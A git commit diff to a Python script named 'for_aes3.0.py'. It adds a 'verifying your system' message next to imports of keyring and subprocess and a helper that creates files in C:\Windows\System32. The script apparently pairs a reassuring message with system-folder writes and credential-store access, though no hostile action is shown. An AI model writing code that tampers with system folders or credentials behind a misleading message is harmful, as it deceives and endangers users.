76bb9d83e8ef75a6ebff019ff60cc29cc78cc02b
nvtsxlz <165018144+nvtsxlz@users.noreply.github.com>
2024-09-13 15:33:03 +0800

    Update for_aes3.0.py

--- for_aes3.0.py
+++ for_aes3.0.py
@@ -8,7 +8,8 @@ import keyring
 import subprocess
 os.system('cls')
 mylogo()
-printg('please wait a moment')
+printg("please wait a moment")
+printg("AES is verifying your system.")
 def create_file_in_system32(filename, content=''):
     system32_path = r'C:\Windows\System32'
     file_path = os.path.join(system32_path, filename)  
